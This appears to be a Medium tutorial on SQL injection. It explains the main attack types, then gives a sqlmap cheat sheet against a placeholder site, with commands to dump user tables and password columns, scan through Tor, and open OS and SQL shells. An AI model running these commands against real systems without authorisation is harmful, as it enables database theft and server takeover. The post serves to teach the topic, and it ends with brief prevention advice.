# :game_die: Medium

---

# SQL Injection: An Overview

written by = [anshul vyas](https://www.instagram.com/_ansh_vyas/)

## Introduction

SQL stands for (Structure Query Language) and was developed in the 1970s by IBM researchers Raymond Boyce and Donald Chamberlin, this language is a backend language that helps in managing the database, this language can edit the database and further can retrieve it, and also can update, delete, and create a new database data is stored in the database in the
form of tables, row, and columns

## What is SQL injection?

SQL injection (also known as SQLi) this a particular type of injection attack that helps to manipulate the SQL database to retrieve the content present in the SQL database without any authentication. If a successful SQL injection is performed by an individual or an organization, it can harm the goodwill which will be atrocious for the business

## How can SQL injection harm?

SQL injection is a critical vulnerability that needs to be fixed as fast as can, not only it harms goodwill but it also harms user experience it is so critical vulnerability that the national vulnerability database has given it a 9.8 (critical) score. Any hacker can dump all the content present in the database by just some simple clicking

## Types Of SQL injection

There are basically 3 types of SQL injection subcategorized into 2

### 1. In-band SQLi

This type of SQL injection is of simple type and efficiency. This makes this the most common type of attack. This is also categorized into 2 categories:

- **Error-based SQLi: **In this attack attacker intentionally produces an error message, and from that message, an attacker can gather information about the web application and database

- **Union-based SQLi:** In this attack, hackers use Union operator to exploit the vulnerability.

```
Example — 'UNION SELECT * FROM users, communion SELECT * FROM users, courses
```

which are then returned as part of the HTTP response.

### 2. Inferential SQLi

Inferential SQL injection, its not like others SQL injections in-band SQLi, perhaps take longer for an malicious hacker to exploit, however, it is just as dangerous as any other form of SQL injection in this also there are 2 type

- **Time-based SQLi:** In this attackers send a SQL query to the database, making the database to wait for some time (in seconds) before it responds to the query weather it is true or false.

- **Boolean SQLi:** In this attackers send a SQL query to the database, while letting the application to respond by generating weather it is true or false result.

### 3. Out-of-band SQLi

This type of attack is executed under two situations when attackers is not
able to use the same medium to launch the attack as well as gathered information or when a server is either very laggy or unstable to perform these certain types of actions.

## How to exploit SQL injection?

The best way to learn SQL injection is through portswigger labs
The best tools to exploit SQL injection is through some penetration testing tools like

- SQL MAP

- BURPSUITE

- JSQLMAP

- QSCANNER

- BBQSQL

## Get Anshul vyas’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Here i am going to explain it through SQL MAP. You can install SQL MAP from [https://github.com/sqlmapproject/sqlmap.git](https://github.com/sqlmapproject/sqlmap.git). However it is preinstalled in Kali linux

### Easy Scanning option

```
sqlmap -u "http://testsite.com/login.php"
```

### Scanning by using tor

```
sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5
```

### Scanning by manually setting the return time

```
sqlmap -u "http://testsite.com/login.php" --time-sec 15
```

### List all databases at the site

```
sqlmap -u "http://testsite.com/login.php" --dbs
```

### List all tables in a specific database

```
sqlmap -u "http://testsite.com/login.php" -D site_db --tables
```

### Dump the contents of a DB table

```
sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump
```

### List all columns in a table

```
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns
```

### Dump only selected columns

```
sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump
```

### When having an admin credential, we can dump a database

```
sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users –dump
```

### Get OS Shell

```
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --os-shell
```

### Get SQL Shell

```
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell
```

## SQL injection prevention

- Continuous Scanning and Penetration Testing

- Restrict Privileges on database

- Use Query Parameters

---
